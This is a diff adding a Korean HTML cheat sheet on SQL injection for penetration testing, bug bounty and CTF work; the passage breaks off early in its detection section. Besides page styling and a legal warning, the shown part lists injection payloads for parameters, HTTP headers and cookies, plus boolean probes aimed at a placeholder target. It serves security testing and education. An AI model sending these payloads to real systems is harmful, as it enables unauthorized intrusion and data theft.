@@ -1,0 +1,3247 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <!-- ============================================================
+       SQL Injection 실전 치트시트
+       작성 목적  : 모의해킹 / 버그바운티 / CTF 실전 레퍼런스
+       대상 독자  : 보안 연구자, 침투 테스터
+       GitHub Pages 배포 전용 단일 파일 (CDN: highlight.js)
+       ============================================================ -->
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SQL Injection 실전 치트시트</title>
+  <meta name="description" content="MySQL, MSSQL, PostgreSQL, Oracle — 실전 SQLi 치트시트" />
+
+  <!-- ── 구글 폰트: 코드용 JetBrains Mono, UI용 Inter ── -->
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet" />
+
+  <!-- ── highlight.js: SQL 코드 블록 구문 강조 ── -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css" />
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+
+  <style>
+    /* ============================================================
+       CSS 변수 — 전체 색상/간격 시스템 정의
+       GitHub Light 팔레트 기반 라이트 모드
+       ============================================================ */
+    :root {
+      /* 배경 레이어 */
+      --bg-base:    #ffffff;   /* 최하위 페이지 배경 */
+      --bg-card:    #f6f8fa;   /* 카드/섹션 배경 */
+      --bg-code:    #f6f8fa;   /* 코드 블록 배경 */
+      --bg-hover:   #eaeef2;   /* 호버 상태 */
+      --bg-search:  #f6f8fa;   /* 검색창 배경 */
+
+      /* 테두리 */
+      --border:     #d0d7de;   /* 기본 테두리 */
+      --border-hi:  #0969da30; /* 하이라이트 테두리 */
+
+      /* 텍스트 */
+      --text-pri:   #1f2328;   /* 본문 텍스트 */
+      --text-sec:   #59636e;   /* 보조 텍스트 */
+      --text-mute:  #8c959f;   /* 희미한 텍스트 */
+      --text-code:  #1f2328;   /* 코드 텍스트 */
+
+      /* 강조 색상 — 의미별 구분 (라이트 배경에서 충분한 명도 대비를 갖도록 조정) */
+      --yellow:     #9a6700;   /* 주요 강조, 경고 (amber) */
+      --cyan:       #1b7c83;   /* 정보, 링크 (teal) */
+      --green:      #1a7f37;   /* 성공, 가능 */
+      --red:        #cf222e;   /* 위험, 불가 */
+      --blue:       #0969da;   /* 일반 정보 */
+      --purple:     #8250df;   /* 고급 기법 */
+      --orange:     #bc4c00;   /* 주의 */
+
+      /* 배지 배경 (반투명) */
+      --badge-yellow: #9a670020;
+      --badge-cyan:   #1b7c8320;
+      --badge-green:  #1a7f3720;
+      --badge-red:    #cf222e20;
+      --badge-purple: #8250df20;
+      --badge-orange: #bc4c0020;
+      --badge-gray:   #8c959f20;
+
+      /* 폰트 */
+      --font-mono: 'JetBrains Mono', 'Fira Code', 'Consolas', monospace;
+      --font-ui:   'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+
+      /* 레이아웃 */
+      --sidebar-w: 260px;   /* 사이드바 너비 */
+      --content-max: 900px; /* 콘텐츠 최대 너비 */
+      --radius: 6px;        /* 기본 라운드 */
+      --radius-lg: 10px;    /* 카드 라운드 */
+    }
+
+    /* ── 리셋 및 기본 설정 ── */
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    html { scroll-behavior: smooth; }
+
+    body {
+      font-family: var(--font-ui);
+      background: var(--bg-base);
+      color: var(--text-pri);
+      font-size: 15px;
+      line-height: 1.6;
+      /* 사이드바 너비만큼 본문 밀기 */
+      margin-left: var(--sidebar-w);
+      min-height: 100vh;
+    }
+
+    /* ============================================================
+       사이드바 — 고정 좌측 내비게이션
+       섹션 스크롤 시 활성 항목 자동 하이라이트
+       ============================================================ */
+    #sidebar {
+      position: fixed;
+      top: 0; left: 0;
+      width: var(--sidebar-w);
+      height: 100vh;
+      background: var(--bg-card);
+      border-right: 1px solid var(--border);
+      overflow-y: auto;
+      z-index: 100;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* 사이드바 스크롤바 스타일링 */
+    #sidebar::-webkit-scrollbar { width: 4px; }
+    #sidebar::-webkit-scrollbar-track { background: transparent; }
+    #sidebar::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
+
+    /* 사이드바 헤더 (로고 영역) */
+    .sidebar-header {
+      padding: 20px 16px 14px;
+      border-bottom: 1px solid var(--border);
+      flex-shrink: 0;
+    }
+    .sidebar-logo {
+      font-family: var(--font-mono);
+      font-size: 11px;
+      font-weight: 700;
+      color: var(--yellow);
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+    }
+    .sidebar-logo span { color: var(--text-sec); font-weight: 400; }
+
+    /* 검색창 */
+    .sidebar-search {
+      padding: 10px 12px;
+      border-bottom: 1px solid var(--border);
+      flex-shrink: 0;
+    }
+    #search-input {
+      width: 100%;
+      background: var(--bg-search);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      color: var(--text-pri);
+      font-family: var(--font-ui);
+      font-size: 12px;
+      padding: 6px 10px;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+    #search-input:focus { border-color: var(--yellow); }
+    #search-input::placeholder { color: var(--text-mute); }
+
+    /* 내비게이션 링크 목록 */
+    .sidebar-nav {
+      padding: 8px 0;
+      flex: 1;
+    }
+    .nav-group {
+      margin: 4px 0;
+    }
+    .nav-group-label {
+      font-size: 10px;
+      font-weight: 600;
+      color: var(--text-mute);
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      padding: 8px 16px 4px;
+    }
+    .nav-link {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 5px 16px;
+      font-size: 12.5px;
+      color: var(--text-sec);
+      text-decoration: none;
+      transition: color 0.15s, background 0.15s;
+      border-left: 2px solid transparent;
+    }
+    .nav-link:hover { color: var(--text-pri); background: var(--bg-hover); }
+    /* 스크롤 스파이로 활성화되는 클래스 */
+    .nav-link.active {
+      color: var(--yellow);
+      border-left-color: var(--yellow);
+      background: var(--badge-yellow);
+    }
+    .nav-link .nav-num {
+      font-family: var(--font-mono);
+      font-size: 10px;
+      color: var(--text-mute);
+      min-width: 18px;
+    }
+    .nav-link.active .nav-num { color: var(--yellow); }
+
+    /* 사이드바 하단 출처 정보 */
+    .sidebar-footer {
+      padding: 12px 16px;
+      border-top: 1px solid var(--border);
+      font-size: 10px;
+      color: var(--text-mute);
+      flex-shrink: 0;
+    }
+    .sidebar-footer a { color: var(--cyan); text-decoration: none; }
+
+    /* ============================================================
+       메인 콘텐츠 영역
+       ============================================================ */
+    #main {
+      max-width: var(--content-max);
+      margin: 0 auto;
+      padding: 40px 32px 80px;
+    }
+
+    /* 페이지 헤더 */
+    .page-header {
+      margin-bottom: 48px;
+      padding-bottom: 24px;
+      border-bottom: 1px solid var(--border);
+    }
+    .page-eyebrow {
+      font-family: var(--font-mono);
+      font-size: 11px;
+      color: var(--yellow);
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      margin-bottom: 10px;
+    }
+    .page-title {
+      font-size: 32px;
+      font-weight: 600;
+      color: var(--text-pri);
+      line-height: 1.2;
+      margin-bottom: 12px;
+    }
+    .page-title em {
+      font-style: normal;
+      color: var(--yellow);
+    }
+    .page-desc {
+      font-size: 14px;
+      color: var(--text-sec);
+      max-width: 600px;
+    }
+
+    /* 경고 배너 */
+    .warning-banner {
+      background: var(--badge-red);
+      border: 1px solid var(--red);
+      border-radius: var(--radius-lg);
+      padding: 12px 16px;
+      font-size: 13px;
+      color: var(--text-pri);
+      margin-bottom: 32px;
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+    }
+    .warning-banner .icon { color: var(--red); font-size: 16px; flex-shrink: 0; margin-top: 1px; }
+
+    /* 빠른 결정 박스 */
+    .decision-box {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-lg);
+      padding: 20px 24px;
+      margin-bottom: 40px;
+    }
+    .decision-box h3 {
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--yellow);
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      margin-bottom: 14px;
+    }
+    .decision-flow { font-family: var(--font-mono); font-size: 12px; color: var(--text-sec); line-height: 2; white-space: pre; overflow-x: auto; }
+    .decision-flow .hl-y { color: var(--yellow); }
+    .decision-flow .hl-c { color: var(--cyan); }
+    .decision-flow .hl-g { color: var(--green); }
+    .decision-flow .hl-r { color: var(--red); }
+    .decision-flow .hl-p { color: var(--purple); }
+
+    /* ============================================================
+       섹션 카드 — 각 공격 기법의 컨테이너
+       ============================================================ */
+    .section-block {
+      margin-bottom: 48px;
+    }
+
+    /* 섹션 헤더 */
+    .section-header {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 20px;
+    }
+    .section-num {
+      font-family: var(--font-mono);
+      font-size: 11px;
+      font-weight: 700;
+      color: var(--text-mute);
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 2px 8px;
+      min-width: 32px;
+      text-align: center;
+    }
+    .section-title {
+      font-size: 20px;
+      font-weight: 600;
+      color: var(--text-pri);
+    }
+    .section-badge {
+      font-size: 10px;
+      font-weight: 600;
+      padding: 2px 8px;
+      border-radius: 20px;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      margin-left: auto;
+    }
+    /* 배지 색상 변형 */
+    .badge-yellow  { background: var(--badge-yellow);  color: var(--yellow); border: 1px solid var(--yellow)30; }
+    .badge-cyan    { background: var(--badge-cyan);    color: var(--cyan);   border: 1px solid var(--cyan)30; }
+    .badge-green   { background: var(--badge-green);   color: var(--green);  border: 1px solid var(--green)30; }
+    .badge-red     { background: var(--badge-red);     color: var(--red);    border: 1px solid var(--red)30; }
+    .badge-purple  { background: var(--badge-purple);  color: var(--purple); border: 1px solid var(--purple)30; }
+    .badge-orange  { background: var(--badge-orange);  color: var(--orange); border: 1px solid var(--orange)30; }
+    .badge-gray    { background: var(--badge-gray);    color: var(--text-sec); border: 1px solid var(--border); }
+
+    /* 섹션 설명 텍스트 */
+    .section-desc {
+      font-size: 13px;
+      color: var(--text-sec);
+      margin-bottom: 16px;
+      padding: 10px 14px;
+      background: var(--bg-card);
+      border-left: 3px solid var(--yellow);
+      border-radius: 0 var(--radius) var(--radius) 0;
+    }
+    .section-desc strong { color: var(--yellow); font-weight: 600; }
+
+    /* 서브섹션 */
+    .sub-section {
+      margin-bottom: 20px;
+    }
+    .sub-title {
+      font-size: 13px;
+      font-weight: 600;
+      color: var(--cyan);
+      font-family: var(--font-mono);
+      margin-bottom: 8px;
+      padding-bottom: 6px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    /* ============================================================
+       코드 블록 — 핵심 UI 요소
+       복사 버튼 포함
+       ============================================================ */
+    .code-wrap {
+      position: relative;
+      margin: 12px 0;
+    }
+    /* 복사 버튼 */
+    .copy-btn {
+      position: absolute;
+      top: 8px; right: 8px;
+      background: var(--bg-hover);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      color: var(--text-sec);
+      font-size: 11px;
+      font-family: var(--font-ui);
+      padding: 3px 8px;
+      cursor: pointer;
+      transition: all 0.15s;
+      z-index: 2;
+    }
+    .copy-btn:hover { color: var(--text-pri); border-color: var(--yellow); }
+    .copy-btn.copied { color: var(--green); border-color: var(--green); }
+
+    /* highlight.js 기본 스타일 위에 덧씌우는 커스텀 */
+    pre {
+      margin: 0;
+      border-radius: var(--radius-lg);
+      border: 1px solid var(--border);
+      overflow-x: auto;
+    }
+    pre code.hljs {
+      font-family: var(--font-mono);
+      font-size: 12.5px;
+      line-height: 1.7;
+      padding: 16px;
+      background: var(--bg-code);
+    }
+    /* 인라인 코드 */
+    code:not(.hljs) {
+      font-family: var(--font-mono);
+      font-size: 12px;
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      padding: 1px 5px;
+      color: var(--cyan);
+    }
+
+    /* ============================================================
+       DB 비교 테이블 — 4컬럼 그리드
+       ============================================================ */
+    .db-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 8px;
+      margin: 12px 0;
+    }
+    .db-col {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-lg);
+      overflow: hidden;
+    }
+    .db-head {
+      background: var(--bg-hover);
+      padding: 7px 12px;
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--text-pri);
+      border-bottom: 1px solid var(--border);
+      font-family: var(--font-mono);
+    }
+    .db-head.mysql    { border-top: 2px solid var(--orange); }
+    .db-head.mssql    { border-top: 2px solid var(--blue); }
+    .db-head.pgsql    { border-top: 2px solid var(--cyan); }
+    .db-head.oracle   { border-top: 2px solid var(--red); }
+    .db-body { padding: 10px 12px; }
+    .db-label {
+      font-size: 10px;
+      color: var(--text-mute);
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      margin: 8px 0 4px;
+    }
+    .db-label:first-child { margin-top: 0; }
+    .db-item {
+      font-family: var(--font-mono);
+      font-size: 11.5px;
+      color: var(--text-pri);
+      padding: 2px 0;
+      line-height: 1.5;
+    }
+    .db-item.ok   { color: var(--green); }
+    .db-item.no   { color: var(--red); }
+    .db-item.warn { color: var(--orange); }
+
+    /* 일반 비교 테이블 */
+    .compare-table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 13px;
+      margin: 12px 0;
+    }
+    .compare-table th {
+      background: var(--bg-hover);
+      color: var(--text-pri);
+      font-weight: 600;
+      padding: 8px 12px;
+      text-align: left;
+      border: 1px solid var(--border);
+      font-size: 12px;
+    }
+    .compare-table td {
+      padding: 7px 12px;
+      border: 1px solid var(--border);
+      color: var(--text-sec);
+      font-size: 12.5px;
+      vertical-align: top;
+    }
+    .compare-table td code { font-size: 11.5px; }
+    .compare-table tr:hover td { background: var(--bg-hover); }
+    .compare-table .pri { color: var(--text-pri); font-weight: 500; }
+    .compare-table .tag-green  { color: var(--green); }
+    .compare-table .tag-red    { color: var(--red); }
+    .compare-table .tag-orange { color: var(--orange); }
+    .compare-table .tag-cyan   { color: var(--cyan); }
+
+    /* ============================================================
+       단계별 가이드 — 번호 있는 플로우
+       ============================================================ */
+    .step-list { display: flex; flex-direction: column; gap: 0; }
+    .step-item {
+      display: flex;
+      gap: 14px;
+      padding: 12px 0;
+      border-bottom: 1px solid var(--border);
+    }
+    .step-item:last-child { border-bottom: none; }
+    .step-num {
+      width: 24px; height: 24px;
+      border-radius: 50%;
+      background: var(--badge-yellow);
+      border: 1px solid var(--yellow)60;
+      color: var(--yellow);
+      font-size: 11px;
+      font-weight: 700;
+      font-family: var(--font-mono);
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0;
+      margin-top: 2px;
+    }
+    .step-body { flex: 1; }
+    .step-title { font-size: 13px; font-weight: 600; color: var(--text-pri); margin-bottom: 4px; }
+    .step-desc  { font-size: 12px; color: var(--text-sec); }
+
+    /* ============================================================
+       정보/경고 박스
+       ============================================================ */
+    .info-box, .warn-box, .danger-box, .tip-box {
+      border-radius: var(--radius);
+      padding: 10px 14px;
+      font-size: 12.5px;
+      margin: 10px 0;
+      display: flex;
+      gap: 10px;
+      align-items: flex-start;
+    }
+    .info-box   { background: #58a6ff15; border: 1px solid var(--blue)40;   color: var(--text-sec); }
+    .warn-box   { background: var(--badge-orange); border: 1px solid var(--orange)50; color: var(--text-sec); }
+    .danger-box { background: var(--badge-red);    border: 1px solid var(--red)50;    color: var(--text-sec); }
+    .tip-box    { background: var(--badge-green);  border: 1px solid var(--green)50;  color: var(--text-sec); }
+    .info-box   .box-icon { color: var(--blue);   }
+    .warn-box   .box-icon { color: var(--orange); }
+    .danger-box .box-icon { color: var(--red);    }
+    .tip-box    .box-icon { color: var(--green);  }
+    .box-icon { font-size: 14px; flex-shrink: 0; }
+
+    /* ============================================================
+       섹션 구분선
+       ============================================================ */
+    .section-divider {
+      height: 1px;
+      background: linear-gradient(90deg, var(--yellow)40, transparent);
+      margin: 40px 0;
+    }
+
+    /* ============================================================
+       입력 포인트 그리드 카드
+       ============================================================ */
+    .point-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 8px;
+      margin: 12px 0;
+    }
+    .point-card {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-lg);
+      padding: 12px 14px;
+      transition: border-color 0.2s;
+    }
+    .point-card:hover { border-color: var(--yellow)60; }
+    .point-card .pc-title {
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--yellow);
+      font-family: var(--font-mono);
+      margin-bottom: 4px;
+    }
+    .point-card .pc-example {
+      font-size: 11px;
+      color: var(--text-sec);
+      font-family: var(--font-mono);
+      margin-bottom: 4px;
+    }
+    .point-card .pc-how {
+      font-size: 11px;
+      color: var(--text-mute);
+    }
+
+    /* ============================================================
+       반응형 — 모바일 (768px 이하)
+       ============================================================ */
+    @media (max-width: 768px) {
+      body { margin-left: 0; }
+      #sidebar {
+        transform: translateX(-100%);
+        transition: transform 0.3s ease;
+      }
+      #sidebar.open { transform: translateX(0); }
+      #main { padding: 20px 16px 60px; }
+      .page-title { font-size: 24px; }
+      .db-grid { grid-template-columns: repeat(2, 1fr); }
+      .point-grid { grid-template-columns: repeat(2, 1fr); }
+      #mobile-menu-btn {
+        display: flex;
+        position: fixed;
+        bottom: 20px; right: 20px;
+        width: 48px; height: 48px;
+        border-radius: 50%;
+        background: var(--yellow);
+        border: none;
+        cursor: pointer;
+        align-items: center; justify-content: center;
+        font-size: 20px;
+        z-index: 200;
+        box-shadow: 0 4px 16px #0008;
+      }
+    }
+    @media (min-width: 769px) {
+      #mobile-menu-btn { display: none; }
+    }
+
+    /* ============================================================
+       인쇄 스타일
+       ============================================================ */
+    @media print {
+      body { margin: 0; color: #000; background: #fff; }
+      #sidebar { display: none; }
+      #main { max-width: 100%; padding: 20px; }
+      pre, .code-wrap { break-inside: avoid; }
+    }
+
+    /* ============================================================
+       검색 필터 — JS와 연동
+       ============================================================ */
+    .section-block.hidden { display: none; }
+
+    /* 맨 위로 버튼 */
+    #back-to-top {
+      position: fixed;
+      bottom: 24px; right: 24px;
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      color: var(--text-sec);
+      font-size: 12px;
+      font-family: var(--font-ui);
+      padding: 6px 12px;
+      cursor: pointer;
+      opacity: 0;
+      transition: opacity 0.2s, color 0.2s;
+      z-index: 50;
+    }
+    #back-to-top.visible { opacity: 1; }
+    #back-to-top:hover { color: var(--yellow); border-color: var(--yellow); }
+  </style>
+</head>
+
+<body>
+
+<!-- ============================================================
+     모바일 메뉴 버튼 (768px 이하에서만 표시)
+     ============================================================ -->
+<button id="mobile-menu-btn" onclick="toggleSidebar()" aria-label="메뉴 열기">☰</button>
+
+<!-- ============================================================
+     맨 위로 버튼
+     ============================================================ -->
+<button id="back-to-top" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑ 위로</button>
+
+<!-- ============================================================
+     사이드바 — 고정 좌측 내비게이션
+     ============================================================ -->
+<nav id="sidebar" role="navigation" aria-label="치트시트 내비게이션">
+
+  <div class="sidebar-header">
+    <div class="sidebar-logo">SQLi<span> / Cheatsheet</span></div>
+    <div style="font-size:10px; color:var(--text-mute); margin-top:4px;">MySQL · MSSQL · PostgreSQL · Oracle</div>
+  </div>
+
+  <div class="sidebar-search">
+    <input type="search" id="search-input" placeholder="섹션 검색..." aria-label="섹션 검색" />
+  </div>
+
+  <div class="sidebar-nav">
+    <!-- 각 nav-link의 href는 섹션 id와 일치해야 함 -->
+    <div class="nav-group-label">탐색 / 탐지</div>
+    <a href="#s-input"   class="nav-link"><span class="nav-num">01</span>입력 포인트 식별</a>
+    <a href="#s-detect"  class="nav-link"><span class="nav-num">02</span>취약점 탐지</a>
+    <a href="#s-dbid"    class="nav-link"><span class="nav-num">03</span>DB 종류 식별</a>
+
+    <div class="nav-group-label">In-Band 공격</div>
+    <a href="#s-union"   class="nav-link"><span class="nav-num">04</span>UNION-Based</a>
+    <a href="#s-error"   class="nav-link"><span class="nav-num">05</span>Error-Based</a>
+
+    <div class="nav-group-label">Blind 공격</div>
+    <a href="#s-bool"    class="nav-link"><span class="nav-num">06</span>Boolean-Based</a>
+    <a href="#s-time"    class="nav-link"><span class="nav-num">07</span>Time-Based</a>
+    <a href="#s-oob"     class="nav-link"><span class="nav-num">08</span>Out-of-Band</a>
+
+    <div class="nav-group-label">특수 기법</div>
+    <a href="#s-auth"    class="nav-link"><span class="nav-num">09</span>인증 우회</a>
+    <a href="#s-stacked" class="nav-link"><span class="nav-num">10</span>Stacked Queries</a>
+    <a href="#s-second"  class="nav-link"><span class="nav-num">11</span>Second-Order</a>
+    <a href="#s-waf"     class="nav-link"><span class="nav-num">12</span>WAF 우회</a>
+
+    <div class="nav-group-label">DB별 레퍼런스</div>
+    <a href="#s-mysql"   class="nav-link"><span class="nav-num">13a</span>MySQL</a>
+    <a href="#s-mssql"   class="nav-link"><span class="nav-num">13b</span>MSSQL</a>
+    <a href="#s-pgsql"   class="nav-link"><span class="nav-num">13c</span>PostgreSQL</a>
+    <a href="#s-oracle"  class="nav-link"><span class="nav-num">13d</span>Oracle</a>
+
+    <div class="nav-group-label">고급</div>
+    <a href="#s-file"    class="nav-link"><span class="nav-num">14</span>파일/OS 실행</a>
+    <a href="#s-sqlmap"  class="nav-link"><span class="nav-num">15</span>sqlmap 기초</a>
+    <a href="#s-flow"    class="nav-link"><span class="nav-num">16</span>공격 흐름 결정</a>
+
+    <div class="nav-group-label">도구 연계</div>
+    <a href="#s-nuclei"  class="nav-link"><span class="nav-num">17</span>Nuclei 템플릿</a>
+    <a href="#s-burpext" class="nav-link"><span class="nav-num">18</span>Burp 확장</a>
+  </div>
+
+  <div class="sidebar-footer">
+    출처: <a href="https://pentestmonkey.net/category/cheat-sheet/sql-injection" target="_blank">pentestmonkey</a> ·
+    <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet" target="_blank">PortSwigger</a> ·
+    <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank">PayloadsAllTheThings</a>
+  </div>
+</nav>
+
+<!-- ============================================================
+     메인 콘텐츠
+     ============================================================ -->
+<main id="main">
+
+  <!-- 페이지 헤더 -->
+  <header class="page-header">
+    <div class="page-eyebrow">▸ SQL Injection / Real-World Cheatsheet</div>
+    <h1 class="page-title">SQL <em>Injection</em> 실전 치트시트</h1>
+    <p class="page-desc">MySQL · MSSQL · PostgreSQL · Oracle 기반 모의해킹/버그바운티/CTF 실전 레퍼런스. 공격 유형별 탐지→열거→추출 전체 흐름 포함.</p>
+  </header>
+
+  <!-- 법적 경고 배너 -->
+  <div class="warning-banner">
+    <span class="icon">⚠</span>
+    <div>
+      <strong style="color:var(--red)">법적 경고</strong><br>
+      이 문서의 모든 기법은 <strong>인가된 시스템</strong>(본인 소유 또는 명시적 서면 허가를 받은 대상)에서만 사용하십시오.
+      무단 공격은 정보통신망법 위반으로 형사 처벌 대상입니다. CTF 또는 개인 랩 환경에서 학습 목적으로만 사용할 것을 권장합니다.
+    </div>
+  </div>
+
+  <!-- 빠른 결정 다이어그램 -->
+  <div class="decision-box">
+    <h3>▸ 공격 방법 빠른 결정</h3>
+    <div class="decision-flow">
+<span class="hl-y">[ 화면에 결과가 직접 출력됨? ]</span>
+  YES →  <span class="hl-c">UNION-Based</span>    —  UNION SELECT, ORDER BY
+  NO  ↓
+<span class="hl-y">[ 에러 메시지 내용이 보임? ]</span>
+  YES →  <span class="hl-r">Error-Based</span>    —  extractvalue / CAST / CONVERT
+  NO  ↓
+<span class="hl-y">[ 성공/실패 반응이 다름? ]</span>
+  YES →  <span class="hl-g">Boolean-Based</span>  —  AND + substring()
+  NO  ↓
+<span class="hl-y">[ 응답 시간 차이 가능? ]</span>
+  YES →  <span class="hl-g">Time-Based</span>     —  IF() + SLEEP() / WAITFOR
+  NO  →  <span class="hl-p">Out-of-Band</span>    —  DNS/HTTP 외부 채널 유출</div>
+  </div>
+
+  <!-- ============================================================
+       01. 입력 포인트 식별
+       ============================================================ -->
+  <section class="section-block" id="s-input">
+    <div class="section-header">
+      <span class="section-num">01</span>
+      <h2 class="section-title">입력 포인트 식별</h2>
+      <span class="section-badge badge-yellow">탐색</span>
+    </div>
+
+    <div class="section-desc">
+      SQLi는 GET/POST 파라미터에만 있지 않다. <strong>모든 입력 경로</strong>를 체계적으로 테스트해야 한다.
+      자동화 도구(Burp Suite)와 수동 탐색을 병행할 것.
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">1.1 입력 경로 종류</div>
+      <div class="point-grid">
+        <div class="point-card">
+          <div class="pc-title">GET 파라미터</div>
+          <div class="pc-example">?id=1&category=2</div>
+          <div class="pc-how">URL에서 직접 확인</div>
+        </div>
+        <div class="point-card">
+          <div class="pc-title">POST 바디</div>
+          <div class="pc-example">username=admin&pass=x</div>
+          <div class="pc-how">Burp Intercept</div>
+        </div>
+        <div class="point-card">
+          <div class="pc-title">Cookie</div>
+          <div class="pc-example">Cookie: session=abc</div>
+          <div class="pc-how">DevTools > Application</div>
+        </div>
+        <div class="point-card">
+          <div class="pc-title">HTTP 헤더</div>
+          <div class="pc-example">X-Forwarded-For: 1.1.1.1</div>
+          <div class="pc-how">Burp > Request Headers</div>
+        </div>
+        <div class="point-card">
+          <div class="pc-title">JSON 바디</div>
+          <div class="pc-example">{"id":"1","q":"test"}</div>
+          <div class="pc-how">API 요청 (Repeater)</div>
+        </div>
+        <div class="point-card">
+          <div class="pc-title">XML/SOAP</div>
+          <div class="pc-example">&lt;id&gt;1&lt;/id&gt;</div>
+          <div class="pc-how">WAF 우회에 활용 가능</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">1.2 Burp Suite 입력 포인트 찾기 흐름</div>
+      <div class="step-list">
+        <div class="step-item">
+          <div class="step-num">1</div>
+          <div class="step-body">
+            <div class="step-title">Proxy 설정 → Intercept ON</div>
+            <div class="step-desc">브라우저 프록시를 127.0.0.1:8080으로 설정 후 대상 사이트 전체 탐색</div>
+          </div>
+        </div>
+        <div class="step-item">
+          <div class="step-num">2</div>
+          <div class="step-body">
+            <div class="step-title">HTTP history 확인</div>
+            <div class="step-desc">파라미터가 있는 모든 요청 수집. 검색, 로그인, 정렬, 페이지네이션 등 우선 확인</div>
+          </div>
+        </div>
+        <div class="step-item">
+          <div class="step-num">3</div>
+          <div class="step-body">
+            <div class="step-title">Send to Repeater → 파라미터에 <code>'</code> 삽입</div>
+            <div class="step-desc">응답 변화(에러 메시지, 빈 응답, 지연) 확인</div>
+          </div>
+        </div>
+        <div class="step-item">
+          <div class="step-num">4</div>
+          <div class="step-body">
+            <div class="step-title">헤더도 동일하게 테스트</div>
+            <div class="step-desc">User-Agent, Referer, X-Forwarded-For, X-Real-IP, Accept-Language 등</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">1.3 의심 파라미터 유형 (수동 탐색)</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-bash"># 숫자형 파라미터 — 가장 흔한 SQLi 포인트
+https://target.com/items?id=1
+https://target.com/user?uid=42
+
+# 문자열 파라미터
+https://target.com/search?q=test&category=book
+
+# 정렬/필터 파라미터 — ORDER BY 취약점 가능
+https://target.com/list?sort=name&order=asc
+
+# 페이지네이션
+https://target.com/news?page=2&offset=20
+
+# 숨겨진 파라미터 (HTML 소스 확인)
+&lt;input type="hidden" name="user_id" value="42"&gt;
+&lt;input type="hidden" name="cat_id" value="5"&gt;</code></pre>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">1.4 취약할 가능성이 높은 HTTP 헤더</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-http">User-Agent: ' OR 1=1--
+Referer: ' OR 1=1--
+X-Forwarded-For: ' OR 1=1--
+X-Real-IP: ' OR 1=1--
+X-Originating-IP: ' OR 1=1--
+Accept-Language: ' OR 1=1--
+Cookie: session=abc' OR '1'='1</code></pre>
+      </div>
+    </div>
+  </section>
+
+  <div class="section-divider"></div>
+
+  <!-- ============================================================
+       02. 취약점 탐지
+       ============================================================ -->
+  <section class="section-block" id="s-detect">
+    <div class="section-header">
+      <span class="section-num">02</span>
+      <h2 class="section-title">취약점 탐지</h2>
+      <span class="section-badge badge-yellow">탐지</span>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">2.1 기본 에러 유발 문자</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- 이 문자들을 파라미터값에 추가 → 에러 발생 여부 확인
+'         -- 작은따옴표 (가장 기본)
+''        -- 두 개의 따옴표
+`         -- 백틱 (MySQL)
+')        -- 괄호 닫기
+"))       -- 이중 괄호
+\         -- 백슬래시
+--        -- 주석 시작
+/*        -- 블록 주석 시작</code></pre>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">2.2 Boolean 테스트 — 참/거짓 반응 차이 확인</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- [문자열형 파라미터] 따옴표 포함
+' AND '1'='1   -- 참 → 정상 응답
+' AND '1'='2   -- 거짓 → 다른 응답 (빈 화면 or 에러)
+
+-- [숫자형 파라미터] 따옴표 없이
+1 AND 1=1      -- 참 → 정상 응답
+1 AND 1=2      -- 거짓 → 다른 응답
+
